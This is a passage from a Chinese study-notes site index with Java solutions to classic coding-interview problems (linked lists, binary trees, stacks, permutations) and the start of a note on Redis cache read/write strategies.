"},{"id":66,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/21.21.-%E8%B0%83%E6%95%B4%E6%95%B0%E7%BB%84%E9%A1%BA%E5%BA%8F%E4%BD%BF%E5%A5%87%E6%95%B0%E4%BD%8D%E4%BA%8E%E5%81%B6%E6%95%B0%E5%89%8D%E9%9D%A2/","title":"21. 调整数组顺序使奇数位于偶数前面","parent":"数据结构","content":"21. 调整数组顺序使奇数位于偶数前面    题目链接    牛客网\n题目描述    需要保证奇数和奇数，偶数和偶数之间的相对位置不变，这和书本不太一样。例如对于 [1,2,3,4,5]，调整后得到 [1,3,5,2,4]，而不能是 {5,1,3,4,2} 这种相对位置改变的结果。\n\n解题思路    方法一：创建一个新数组，时间复杂度 O(N)，空间复杂度 O(N)。\npublic int[] reOrderArray (int[] nums) { // 奇数个数  int oddCnt = 0; for (int x : nums) if (!isEven(x)) oddCnt++; int[] copy = nums.clone(); int i = 0, j = oddCnt; for (int num : copy) { if (num % 2 == 1) nums[i++] = num; else nums[j++] = num; } return nums; } private boolean isEven(int x) { return x % 2 == 0; } 方法二：使用冒泡思想，每次都将当前偶数上浮到当前最右边。时间复杂度 O(N2)，空间复杂度 O(1)，时间换空间。\npublic int[] reOrderArray(int[] nums) { int N = nums.length; for (int i = N - 1; i \u0026gt; 0; i--) { for (int j = 0; j \u0026lt; i; j++) { if (isEven(nums[j]) \u0026amp;\u0026amp; !isEven(nums[j + 1])) { swap(nums, j, j + 1); } } } return nums; } private boolean isEven(int x) { return x % 2 == 0; } private void swap(int[] nums, int i, int j) { int t = nums[i]; nums[i] = nums[j]; nums[j] = t; } "},{"id":67,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/22.22.-%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%AC-K-%E4%B8%AA%E7%BB%93%E7%82%B9/","title":"22. 链表中倒数第 K 个结点","parent":"数据结构","content":"22. 链表中倒数第 K 个结点    牛客网\n解题思路    设链表的长度为 N。设置两个指针 P1 和 P2，先让 P1 移动 K 个节点，则还有 N - K 个节点可以移动。此时让 P1 和 P2 同时移动，可以知道当 P1 移动到链表结尾时，P2 移动到第 N - K 个节点处，该位置就是倒数第 K 个节点。\n\npublic ListNode FindKthToTail(ListNode head, int k) { if (head == null) return null; ListNode P1 = head; while (P1 != null \u0026amp;\u0026amp; k-- \u0026gt; 0) P1 = P1.next; if (k \u0026gt; 0) return null; ListNode P2 = head; while (P1 != null) { P1 = P1.next; P2 = P2.next; } return P2; } "},{"id":68,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/23.23.-%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%8E%AF%E7%9A%84%E5%85%A5%E5%8F%A3%E7%BB%93%E7%82%B9/","title":"23. 链表中环的入口结点","parent":"数据结构","content":"23. 链表中环的入口结点    NowCoder\n题目描述    一个链表中包含环，请找出该链表的环的入口结点。要求不能使用额外的空间。\n解题思路    使用双指针，一个快指针 fast 每次移动两个节点，一个慢指针 slow 每次移动一个节点。因为存在环，所以两个指针必定相遇在环中的某个节点上。\n假设环入口节点为 y1，相遇所在节点为 z1。\n假设快指针 fast 在圈内绕了 N 圈，则总路径长度为 x+Ny+(N-1)z。z 为 (N-1) 倍是因为快慢指针最后已经在 z1 节点相遇了，后面就不需要再走了。\n而慢指针 slow 总路径长度为 x+y。\n因为快指针是慢指针的两倍，因此 x+Ny+(N-1)z = 2(x+y)。\n我们要找的是环入口节点 y1，也可以看成寻找长度 x 的值，因此我们先将上面的等值分解为和 x 有关：x=(N-2)y+(N-1)z。\n上面的等值没有很强的规律，但是我们可以发现 y+z 就是圆环的总长度，因此我们将上面的等式再分解：x=(N-2)(y+z)+z。这个等式左边是从起点x1 到环入口节点 y1 的长度，而右边是在圆环中走过 (N-2) 圈，再从相遇点 z1 再走过长度为 z 的长度。此时我们可以发现如果让两个指针同时从起点 x1 和相遇点 z1 开始，每次只走过一个距离，那么最后他们会在环入口节点相遇。\n\npublic ListNode EntryNodeOfLoop(ListNode pHead) { if (pHead == null || pHead.next == null) return null; ListNode slow = pHead, fast = pHead; do { fast = fast.next.next; slow = slow.next; } while (slow != fast); fast = pHead; while (slow != fast) { slow = slow.next; fast = fast.next; } return slow; } "},{"id":69,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/24.24.-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/","title":"24. 反转链表","parent":"数据结构","content":"24. 反转链表    NowCoder\n解题思路    递归    public ListNode ReverseList(ListNode head) { if (head == null || head.next == null) return head; ListNode next = head.next; head.next = null; ListNode newHead = ReverseList(next); next.next = head; return newHead; } 迭代    使用头插法。\npublic ListNode ReverseList(ListNode head) { ListNode newList = new ListNode(-1); while (head != null) { ListNode next = head.next; head.next = newList.next; newList.next = head; head = next; } return newList.next; } "},{"id":70,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/25.25.-%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E7%9A%84%E9%93%BE%E8%A1%A8/","title":"25. 合并两个排序的链表","parent":"数据结构","content":"25. 合并两个排序的链表    NowCoder\n题目描述    \n解题思路    递归    public ListNode Merge(ListNode list1, ListNode list2) { if (list1 == null) return list2; if (list2 == null) return list1; if (list1.val \u0026lt;= list2.val) { list1.next = Merge(list1.next, list2); return list1; } else { list2.next = Merge(list1, list2.next); return list2; } } 迭代    public ListNode Merge(ListNode list1, ListNode list2) { ListNode head = new ListNode(-1); ListNode cur = head; while (list1 != null \u0026amp;\u0026amp; list2 != null) { if (list1.val \u0026lt;= list2.val) { cur.next = list1; list1 = list1.next; } else { cur.next = list2; list2 = list2.next; } cur = cur.next; } if (list1 != null) cur.next = list1; if (list2 != null) cur.next = list2; return head.next; } "},{"id":71,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/26.26.-%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84/","title":"26. 树的子结构","parent":"数据结构","content":"26. 树的子结构    题目链接    牛客网\n题目描述    \n解题思路    public boolean HasSubtree(TreeNode root1, TreeNode root2) { if (root1 == null || root2 == null) return false; return isSubtreeWithRoot(root1, root2) || HasSubtree(root1.left, root2) || HasSubtree(root1.right, root2); } private boolean isSubtreeWithRoot(TreeNode root1, TreeNode root2) { if (root2 == null) return true; if (root1 == null) return false; if (root1.val != root2.val) return false; return isSubtreeWithRoot(root1.left, root2.left) \u0026amp;\u0026amp; isSubtreeWithRoot(root1.right, root2.right); } "},{"id":72,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/27.27.-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E5%83%8F/","title":"27. 二叉树的镜像","parent":"数据结构","content":"27. 二叉树的镜像    牛客网\n题目描述    \n解题思路    public TreeNode Mirror(TreeNode root) { if (root == null) return root; swap(root); Mirror(root.left); Mirror(root.right); return root; } private void swap(TreeNode root) { TreeNode t = root.left; root.left = root.right; root.right = t; } "},{"id":73,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/28.28.-%E5%AF%B9%E7%A7%B0%E7%9A%84%E4%BA%8C%E5%8F%89%E6%A0%91/","title":"28. 对称的二叉树","parent":"数据结构","content":"28. 对称的二叉树    NowCoder\n题目描述    \n解题思路    boolean isSymmetrical(TreeNode pRoot) { if (pRoot == null) return true; return isSymmetrical(pRoot.left, pRoot.right); } boolean isSymmetrical(TreeNode t1, TreeNode t2) { if (t1 == null \u0026amp;\u0026amp; t2 == null) return true; if (t1 == null || t2 == null) return false; if (t1.val != t2.val) return false; return isSymmetrical(t1.left, t2.right) \u0026amp;\u0026amp; isSymmetrical(t1.right, t2.left); } "},{"id":74,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/29.29.-%E9%A1%BA%E6%97%B6%E9%92%88%E6%89%93%E5%8D%B0%E7%9F%A9%E9%98%B5/","title":"29. 顺时针打印矩阵","parent":"数据结构","content":"29. 顺时针打印矩阵    题目链接    牛客网\n题目描述    按顺时针的方向，从外到里打印矩阵的值。下图的矩阵打印结果为：1, 2, 3, 4, 8, 12, 16, 15, 14, 13, 9, 5, 6, 7, 11, 10\n\n解题思路    一层一层从外到里打印，观察可知每一层打印都有相同的处理步骤，唯一不同的是上下左右的边界不同了。因此使用四个变量 r1, r2, c1, c2 分别存储上下左右边界值，从而定义当前最外层。打印当前最外层的顺序：从左到右打印最上一行-\u0026gt;从上到下打印最右一行-\u0026gt;从右到左打印最下一行-\u0026gt;从下到上打印最左一行。应当注意只有在 r1 != r2 时才打印最下一行，也就是在当前最外层的行数大于 1 时才打印最下一行，这是因为当前最外层只有一行时，继续打印最下一行，会导致重复打印。打印最左一行也要做同样处理。\n\npublic ArrayList\u0026lt;Integer\u0026gt; printMatrix(int[][] matrix) { ArrayList\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); int r1 = 0, r2 = matrix.length - 1, c1 = 0, c2 = matrix[0].length - 1; while (r1 \u0026lt;= r2 \u0026amp;\u0026amp; c1 \u0026lt;= c2) { // 上  for (int i = c1; i \u0026lt;= c2; i++) ret.add(matrix[r1][i]); // 右  for (int i = r1 + 1; i \u0026lt;= r2; i++) ret.add(matrix[i][c2]); if (r1 != r2) // 下  for (int i = c2 - 1; i \u0026gt;= c1; i--) ret.add(matrix[r2][i]); if (c1 != c2) // 左  for (int i = r2 - 1; i \u0026gt; r1; i--) ret.add(matrix[i][c1]); r1++; r2--; c1++; c2--; } return ret; } "},{"id":75,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.3.-%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/","title":"3. 数组中重复的数字","parent":"数据结构","content":"3. 数组中重复的数字    题目链接    牛客网\n题目描述    在一个长度为 n 的数组里的所有数字都在 0 到 n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字是重复的，也不知道每个数字重复几次。请找出数组中任意一个重复的数字。\nInput: {2, 3, 1, 0, 2, 5} Output: 2 解题思路    要求时间复杂度 O(N)，空间复杂度 O(1)。因此不能使用排序的方法，也不能使用额外的标记数组。\n对于这种数组元素在 [0, n-1] 范围内的问题，可以将值为 i 的元素调整到第 i 个位置上进行求解。在调整过程中，如果第 i 位置上已经有一个值为 i 的元素，就可以知道 i 值重复。\n以 (2, 3, 1, 0, 2, 5) 为例，遍历到位置 4 时，该位置上的数为 2，但是第 2 个位置上已经有一个 2 的值了，因此可以知道 2 重复：\n\npublic int duplicate(int[] nums) { for (int i = 0; i \u0026lt; nums.length; i++) { while (nums[i] != i) { if (nums[i] == nums[nums[i]]) { return nums[i]; } swap(nums, i, nums[i]); } swap(nums, i, nums[i]); } return -1; } private void swap(int[] nums, int i, int j) { int t = nums[i]; nums[i] = nums[j]; nums[j] = t; } "},{"id":76,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/30.30.-%E5%8C%85%E5%90%AB-min-%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88/","title":"30. 包含 min 函数的栈","parent":"数据结构","content":"30. 包含 min 函数的栈    题目链接    牛客网\n题目描述    实现一个包含 min() 函数的栈，该方法返回当前栈中最小的值。\n解题思路    使用一个额外的 minStack，栈顶元素为当前栈中最小的值。在对栈进行 push 入栈和 pop 出栈操作时，同样需要对 minStack 进行入栈出栈操作，从而使 minStack 栈顶元素一直为当前栈中最小的值。在进行 push 操作时，需要比较入栈元素和当前栈中最小值，将值较小的元素 push 到 minStack 中。\n\nprivate Stack\u0026lt;Integer\u0026gt; dataStack = new Stack\u0026lt;\u0026gt;(); private Stack\u0026lt;Integer\u0026gt; minStack = new Stack\u0026lt;\u0026gt;(); public void push(int node) { dataStack.push(node); minStack.push(minStack.isEmpty() ? node : Math.min(minStack.peek(), node)); } public void pop() { dataStack.pop(); minStack.pop(); } public int top() { return dataStack.peek(); } public int min() { return minStack.peek(); } "},{"id":77,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/31.31.-%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97/","title":"31. 栈的压入、弹出序列","parent":"数据结构","content":"31. 栈的压入、弹出序列    题目链接    牛客网\n题目描述    输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否为该栈的弹出顺序。假设压入栈的所有数字均不相等。\n例如序列 1,2,3,4,5 是某栈的压入顺序，序列 4,5,3,2,1 是该压栈序列对应的一个弹出序列，但 4,3,5,1,2 就不可能是该压栈序列的弹出序列。\n解题思路    使用一个栈来模拟压入弹出操作。每次入栈一个元素后，都要判断一下栈顶元素是不是当前出栈序列 popSequence 的第一个元素，如果是的话则执行出栈操作并将 popSequence 往后移一位，继续进行判断。\npublic boolean IsPopOrder(int[] pushSequence, int[] popSequence) { int n = pushSequence.length; Stack\u0026lt;Integer\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); for (int pushIndex = 0, popIndex = 0; pushIndex \u0026lt; n; pushIndex++) { stack.push(pushSequence[pushIndex]); while (popIndex \u0026lt; n \u0026amp;\u0026amp; !stack.isEmpty() \u0026amp;\u0026amp; stack.peek() == popSequence[popIndex]) { stack.pop(); popIndex++; } } return stack.isEmpty(); } "},{"id":78,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/32.132.1-%E4%BB%8E%E4%B8%8A%E5%BE%80%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91/","title":"32.1 从上往下打印二叉树","parent":"数据结构","content":"32.1 从上往下打印二叉树    NowCoder\n题目描述    从上往下打印出二叉树的每个节点，同层节点从左至右打印。\n例如，以下二叉树层次遍历的结果为：1,2,3,4,5,6,7\n\n解题思路    使用队列来进行层次遍历。\n不需要使用两个队列分别存储当前层的节点和下一层的节点，因为在开始遍历一层的节点时，当前队列中的节点数就是当前层的节点数，只要控制遍历这么多节点数，就能保证这次遍历的都是当前层的节点。\npublic ArrayList\u0026lt;Integer\u0026gt; PrintFromTopToBottom(TreeNode root) { Queue\u0026lt;TreeNode\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); ArrayList\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); queue.add(root); while (!queue.isEmpty()) { int cnt = queue.size(); while (cnt-- \u0026gt; 0) { TreeNode t = queue.poll(); if (t == null) continue; ret.add(t.val); queue.add(t.left); queue.add(t.right); } } return ret; } "},{"id":79,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/32.232.2-%E6%8A%8A%E4%BA%8C%E5%8F%89%E6%A0%91%E6%89%93%E5%8D%B0%E6%88%90%E5%A4%9A%E8%A1%8C/","title":"32.2 把二叉树打印成多行","parent":"数据结构","content":"32.2 把二叉树打印成多行    NowCoder\n题目描述    和上题几乎一样。\n解题思路    ArrayList\u0026lt;ArrayList\u0026lt;Integer\u0026gt;\u0026gt; Print(TreeNode pRoot) { ArrayList\u0026lt;ArrayList\u0026lt;Integer\u0026gt;\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); Queue\u0026lt;TreeNode\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); queue.add(pRoot); while (!queue.isEmpty()) { ArrayList\u0026lt;Integer\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); int cnt = queue.size(); while (cnt-- \u0026gt; 0) { TreeNode node = queue.poll(); if (node == null) continue; list.add(node.val); queue.add(node.left); queue.add(node.right); } if (list.size() != 0) ret.add(list); } return ret; } "},{"id":80,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/32.332.3-%E6%8C%89%E4%B9%8B%E5%AD%97%E5%BD%A2%E9%A1%BA%E5%BA%8F%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91/","title":"32.3 按之字形顺序打印二叉树","parent":"数据结构","content":"32.3 按之字形顺序打印二叉树    NowCoder\n题目描述    请实现一个函数按照之字形打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右至左的顺序打印，第三行按照从左到右的顺序打印，其他行以此类推。\n解题思路    public ArrayList\u0026lt;ArrayList\u0026lt;Integer\u0026gt;\u0026gt; Print(TreeNode pRoot) { ArrayList\u0026lt;ArrayList\u0026lt;Integer\u0026gt;\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); Queue\u0026lt;TreeNode\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); queue.add(pRoot); boolean reverse = false; while (!queue.isEmpty()) { ArrayList\u0026lt;Integer\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); int cnt = queue.size(); while (cnt-- \u0026gt; 0) { TreeNode node = queue.poll(); if (node == null) continue; list.add(node.val); queue.add(node.left); queue.add(node.right); } if (reverse) Collections.reverse(list); reverse = !reverse; if (list.size() != 0) ret.add(list); } return ret; } "},{"id":81,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/33.33.-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97/","title":"33. 二叉搜索树的后序遍历序列","parent":"数据结构","content":"33. 二叉搜索树的后序遍历序列    NowCoder\n题目描述    输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。假设输入的数组的任意两个数字都互不相同。\n例如，下图是后序遍历序列 1,3,2 所对应的二叉搜索树。\n\n解题思路    public boolean VerifySquenceOfBST(int[] sequence) { if (sequence == null || sequence.length == 0) return false; return verify(sequence, 0, sequence.length - 1); } private boolean verify(int[] sequence, int first, int last) { if (last - first \u0026lt;= 1) return true; int rootVal = sequence[last]; int cutIndex = first; while (cutIndex \u0026lt; last \u0026amp;\u0026amp; sequence[cutIndex] \u0026lt;= rootVal) cutIndex++; for (int i = cutIndex; i \u0026lt; last; i++) if (sequence[i] \u0026lt; rootVal) return false; return verify(sequence, first, cutIndex - 1) \u0026amp;\u0026amp; verify(sequence, cutIndex, last - 1); } "},{"id":82,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/34.34.-%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%92%8C%E4%B8%BA%E6%9F%90%E4%B8%80%E5%80%BC%E7%9A%84%E8%B7%AF%E5%BE%84/","title":"34. 二叉树中和为某一值的路径","parent":"数据结构","content":"34. 二叉树中和为某一值的路径    NowCoder\n题目描述    输入一颗二叉树和一个整数，打印出二叉树中结点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。\n下图的二叉树有两条和为 22 的路径：10, 5, 7 和 10, 12\n\n解题思路    private ArrayList\u0026lt;ArrayList\u0026lt;Integer\u0026gt;\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); public ArrayList\u0026lt;ArrayList\u0026lt;Integer\u0026gt;\u0026gt; FindPath(TreeNode root, int target) { backtracking(root, target, new ArrayList\u0026lt;\u0026gt;()); return ret; } private void backtracking(TreeNode node, int target, ArrayList\u0026lt;Integer\u0026gt; path) { if (node == null) return; path.add(node.val); target -= node.val; if (target == 0 \u0026amp;\u0026amp; node.left == null \u0026amp;\u0026amp; node.right == null) { ret.add(new ArrayList\u0026lt;\u0026gt;(path)); } else { backtracking(node.left, target, path); backtracking(node.right, target, path); } path.remove(path.size() - 1); } "},{"id":83,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/35.35.-%E5%A4%8D%E6%9D%82%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%8D%E5%88%B6/","title":"35. 复杂链表的复制","parent":"数据结构","content":"35. 复杂链表的复制    NowCoder\n题目描述    输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针指向任意一个节点），返回结果为复制后复杂链表的 head。\npublic class RandomListNode { int label; RandomListNode next = null; RandomListNode random = null; RandomListNode(int label) { this.label = label; } } \n解题思路    第一步，在每个节点的后面插入复制的节点。\n\n第二步，对复制节点的 random 链接进行赋值。\n\n第三步，拆分。\n\npublic RandomListNode Clone(RandomListNode pHead) { if (pHead == null) return null; // 插入新节点  RandomListNode cur = pHead; while (cur != null) { RandomListNode clone = new RandomListNode(cur.label); clone.next = cur.next; cur.next = clone; cur = clone.next; } // 建立 random 链接  cur = pHead; while (cur != null) { RandomListNode clone = cur.next; if (cur.random != null) clone.random = cur.random.next; cur = clone.next; } // 拆分  cur = pHead; RandomListNode pCloneHead = pHead.next; while (cur.next != null) { RandomListNode next = cur.next; cur.next = next.next; cur = next; } return pCloneHead; } "},{"id":84,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/36.36.-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/","title":"36. 二叉搜索树与双向链表","parent":"数据结构","content":"36. 二叉搜索树与双向链表    NowCoder\n题目描述    输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。要求不能创建任何新的结点，只能调整树中结点指针的指向。\n\n解题思路    private TreeNode pre = null; private TreeNode head = null; public TreeNode Convert(TreeNode root) { inOrder(root); return head; } private void inOrder(TreeNode node) { if (node == null) return; inOrder(node.left); node.left = pre; if (pre != null) pre.right = node; pre = node; if (head == null) head = node; inOrder(node.right); } "},{"id":85,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/37.37.-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C%E5%8F%89%E6%A0%91/","title":"37. 序列化二叉树","parent":"数据结构","content":"37. 序列化二叉树    NowCoder\n题目描述    请实现两个函数，分别用来序列化和反序列化二叉树。\n解题思路    private String deserializeStr; public String Serialize(TreeNode root) { if (root == null) return \u0026#34;#\u0026#34;; return root.val + \u0026#34; \u0026#34; + Serialize(root.left) + \u0026#34; \u0026#34; + Serialize(root.right); } public TreeNode Deserialize(String str) { deserializeStr = str; return Deserialize(); } private TreeNode Deserialize() { if (deserializeStr.length() == 0) return null; int index = deserializeStr.indexOf(\u0026#34; \u0026#34;); String node = index == -1 ? deserializeStr : deserializeStr.substring(0, index); deserializeStr = index == -1 ? \u0026#34;\u0026#34; : deserializeStr.substring(index + 1); if (node.equals(\u0026#34;#\u0026#34;)) return null; int val = Integer.valueOf(node); TreeNode t = new TreeNode(val); t.left = Deserialize(); t.right = Deserialize(); return t; } "},{"id":86,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/38.38.-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97/","title":"38. 字符串的排列","parent":"数据结构","content":"38. 字符串的排列    NowCoder\n题目描述    输入一个字符串，按字典序打印出该字符串中字符的所有排列。例如输入字符串 abc，则打印出由字符 a, b, c 所能排列出来的所有字符串 abc, acb, bac, bca, cab 和 cba。\n解题思路    private ArrayList\u0026lt;String\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); public ArrayList\u0026lt;String\u0026gt; Permutation(String str) { if (str.length() == 0) return ret; char[] chars = str.toCharArray(); Arrays.sort(chars); backtracking(chars, new boolean[chars.length], new StringBuilder()); return ret; } private void backtracking(char[] chars, boolean[] hasUsed, StringBuilder s) { if (s.length() == chars.length) { ret.add(s.toString()); return; } for (int i = 0; i \u0026lt; chars.length; i++) { if (hasUsed[i]) continue; if (i != 0 \u0026amp;\u0026amp; chars[i] == chars[i - 1] \u0026amp;\u0026amp; !hasUsed[i - 1]) /* 保证不重复 */ continue; hasUsed[i] = true; s.append(chars[i]); backtracking(chars, hasUsed, s); s.deleteCharAt(s.length() - 1); hasUsed[i] = false; } } "},{"id":87,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/39.39.-%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97/","title":"39. 数组中出现次数超过一半的数字","parent":"数据结构","content":"39. 数组中出现次数超过一半的数字    NowCoder\n解题思路    多数投票问题，可以利用 Boyer-Moore Majority Vote Algorithm 来解决这个问题，使得时间复杂度为 O(N)。\n使用 cnt 来统计一个元素出现的次数，当遍历到的元素和统计元素相等时，令 cnt++，否则令 cnt\u0026ndash;。如果前面查找了 i 个元素，且 cnt == 0，说明前 i 个元素没有 majority，或者有 majority，但是出现的次数少于 i / 2 ，因为如果多于 i / 2 的话 cnt 就一定不会为 0 。此时剩下的 n - i 个元素中，majority 的数目依然多于 (n - i) / 2，因此继续查找就能找出 majority。\npublic int MoreThanHalfNum_Solution(int[] nums) { int majority = nums[0]; for (int i = 1, cnt = 1; i \u0026lt; nums.length; i++) { cnt = nums[i] == majority ? cnt + 1 : cnt - 1; if (cnt == 0) { majority = nums[i]; cnt = 1; } } int cnt = 0; for (int val : nums) if (val == majority) cnt++; return cnt \u0026gt; nums.length / 2 ? majority : 0; } "},{"id":88,"href":"/database/Redis/3%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BC%93%E5%AD%98%E8%AF%BB%E5%86%99%E7%AD%96%E7%95%A5/","title":"3种常用的缓存读写策略","parent":"Redis","content":"看到很多小伙伴简历上写了“熟练使用缓存”，但是被我问到“缓存常用的3种读写策略”的时候却一脸懵逼。\n在我看来，造成这个问题的原因是我们在学习 Redis 的时候，可能只是简单了写一些 Demo，并没有去关注缓存的读写策略，或者说压根不知道这回事。\n但是，搞懂3种常见的缓存读写策略对于实际工作中使用缓存以及面试中被问到缓存都是非常有帮助的！\n下面我会简单介绍一下自己对于这 3 种缓存读写策略的理解。\n另外，这3 种缓存读写策略各有优劣，不存在最佳，需要我们根据具体的业务场景选择更适合的。\n个人能力有限。如果文章有任何需要补充/完善/修改的地方，欢迎在评论区指出，共同进步！——爱你们的 Guide 哥\nCache Aside Pattern（旁路缓存模式）    Cache Aside Pattern 是我们平时使用比较多的一个缓存读写模式，比较适合读请求比较多的场景。\nCache Aside Pattern 中服务端需要同时维系 DB 和 cache，并且是以 DB 的结果为准。\n下面我们来看一下这个策略模式下的缓存读写步骤。\n写 ：\n 先更新 DB 然后直接删除 cache 。  简单画了一张图帮助大家理解写的步骤。\n读 :\n 从 cache 中读取数据，读取到就直接返回 cache中读取不到的话，就从 DB 中读取数据返回 再把数据放到 cache 中。  简单画了一张图帮助大家理解读的步骤。\n你仅仅了解了上面这些内容的话是远远不够的，我们还要搞懂其中的原理。\n比如说面试官很可能会追问：“在写数据的过程中，可以先删除 cache ，后更新 DB 么？”\n答案： 那肯定是不行的！因为这样可能会造成数据库（DB）和缓存（Cache）数据不一致的问题。为什么呢？比如说请求1 先写数据A，请求2随后读数据A的话就很有可能产生数据不一致性的问题。这个过程可以简单描述为：\n 请求1先把cache中的A数据删除 -\u0026gt; 请求2从DB中读取数据-\u0026gt;请求1再把DB中的A数据更新。\n 当你这样回答之后，面试官可能会紧接着就追问：“在写数据的过程中，先更新DB，后删除cache就没有问题了么？”\n答案： 理论上来说还是可能会出现数据不一致性的问题，不过概率非常小，因为缓存的写入速度是比数据库的写入速度快很多！\n比如请求1先读数据 A，请求2随后写数据A，并且数据A不在缓存中的话也有可能产生数据不一致性的问题。这个过程可以简单描述为：\n 请求1从DB读数据A-\u0026gt;请求2写更新数据 A 到数据库并把删除cache中的A数据-\u0026gt;请求1将数据A写入cache。\n 现在我们再来分析一下 Cache Aside Pattern 的缺陷。\n缺陷1：首次请求数据一定不在 cache 的问题\n解决办法：可以将热点数据可以提前放入cache 中。\n缺陷2：写操作比较频繁的话导致cache中的数据会被频繁被删除，这样会影响缓存命中率 。\n解决办法：\n 数据库和缓存数据强一致场景 ：更新DB的时候同样更新cache，不过我们需要加一个锁/分布式锁来保证更新cache的时候不存在线程安全问题。 可以短暂地允许数据库和缓存数据不一致的场景 ：更新DB的时候同样更新cache，但是给缓存加一个比较短的过期时间，这样的话就可以保证即使数据不一致的话影响也比较小。  Read/Write Through Pattern（读写穿透）    Read/Write Through Pattern 中服务端把 cache 视为主要数据存储，从中读取数据并将数据写入其中。cache 服务负责将此数据读取和写入 DB，从而减轻了应用程序的职责。\n这种缓存读写策略小伙伴们应该也发现了在平时在开发过程中非常少见。抛去性能方面的影响，大概率是因为我们经常使用的分布式缓存 Redis 并没有提供 cache 将数据写入DB的功能。\n写（Write Through）：\n 先查 cache，cache 中不存在，直接更新 DB。 cache 中存在，则先更新 cache，然后 cache 服务自己更新 DB（同步更新 cache 和 DB）。  